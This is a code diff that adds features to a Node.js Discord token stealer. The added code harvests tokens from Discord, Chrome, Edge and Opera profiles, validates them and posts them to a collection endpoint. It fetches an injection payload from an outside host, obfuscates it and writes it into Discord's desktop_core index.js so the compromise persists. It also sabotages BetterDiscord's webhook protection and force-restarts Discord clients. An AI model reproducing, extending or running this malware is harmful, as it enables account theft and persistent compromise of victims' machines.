@@ -1,22 +1,27 @@
 const fs = require("fs"),
-    {
-        readFileSync,
-        readdirSync,
-        existsSync
-    } = require("fs"),
+    { readFileSync, readdirSync, existsSync } = require("fs"),
+    { spawnSync, execSync, exec } = require('child_process'),
+    jsobf = require('javascript-obfuscator'),
+    buffreplace = require('buffer-replace'),
+    path = require("path"),
     crypto = require("crypto"),
     aura = require("win-dpapi"),
     axios = require('axios');
 let tokens = new Array(),
-    kill = new Array(),
-    apiEndpoint = "http://localhost:3000/request"
+    injectPath = new Array(),
+
+    apiEndpoint = "http://localhost:3000/request" // here you need to add your api so that the recommendation data can be sent to host in replit lol
     
-    switch (process.platform) {
+switch (process.platform) {
     case "win32":
         let appdata = process.env.appdata,
             localappdata = process.env.localappdata,
+            killdcop = false,
             paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
             cords = ['discord','discordcanary','discordptb','discorddevelopment','lightcord'];
+        
+        discordinjected()
+        tokenfuck()
         
         async function tokenfuck() {
             for (p of paths) {
@@ -75,8 +80,6 @@ let tokens = new Array(),
             }
         }
 
-        tokenfuck()
-
         async function check(t) {
             for (tkn of t) {
                 await axios.get(`https://discord.com/api/v9/users/@me`, {
@@ -94,6 +97,71 @@ let tokens = new Array(),
                 if (tkn) await sendall(tkn)
             }
         }
+
+        async function inject() {
+            let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {AuraThemes: true}});
+            let obf = jsobf.obfuscate(resp.data.replace("*API*", apiEndpoint), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
+            let payload = obf.getObfuscatedCode();
+            injectPath.forEach(file => {
+                try {
+                    fs.writeFileSync(file, payload, {encoding: 'utf8',flag: 'w'});
+                } catch (e) {
+                    console.error(e)
+                };
+            });
+        };
+
+        function findindex(firstpath) {
+            let dcpaths = fs.readdirSync(firstpath);
+            dcpaths.forEach((file) => {
+                let filePath = path.join(firstpath, file);
+                let fileStat = fs.statSync(filePath);
+                if (fileStat.isDirectory()) {findindex(filePath)} else {if (file === "index.js" && !firstpath.includes("node_modules") && firstpath.includes("desktop_core")) {injectPath.push(filePath)}}
+            });
+        }
+
+        async function findinject(firstpath) {
+        const files = await fs.promises.readdir(firstpath);
+            for (const file of files) {
+                const filePath = path.join(firstpath, file);
+                const fileStat = await fs.promises.stat(filePath);
+                if (fileStat.isDirectory()) {
+                    if (file === 'aura') {await fs.rmdirSync(filePath)} else {await findinject(filePath)}
+                }
+            }
+        }
+
+        function betterbroke() {
+            let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
+            if (fs.existsSync(dir)) {
+                x = fs.readFileSync(dir);
+                fs.writeFileSync(dir, buffreplace(x, "api/webhooks", "aurathemesontop"))
+            }
+            return;
+        }
+
+        async function discordinjected() {
+            const discords = fs.readdirSync(localappdata).filter(file => file.includes("iscord")).map(file => path.join(localappdata, file));
+            for (const paths of discords) {findindex(paths)}
+            for (const paths of discords) {await findinject(paths)}
+            await inject();
+            await betterbroke();
+            if (killdcop) {await killalldc()}
+        }
+
+        async function killalldc() {
+            const clients = ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']
+            await exec('tasklist', async (err, stdout, stderr) => {
+                for (const client of clients) {
+                    if (stdout.includes(client)) {
+                        await exec(`taskkill /F /T /IM ${client}`, (err) => {console.error(err)})
+                        await exec(`"${localappdata}/${client.replace('.exe', '')}/Update.exe" --processStart ${client}`, (err) => {console.error(err)})
+                    }
+                }
+            })
+        };
+
+
 
         async function sendall(token) {
             await axios.post(`${apiEndpoint}/obtaining`, 
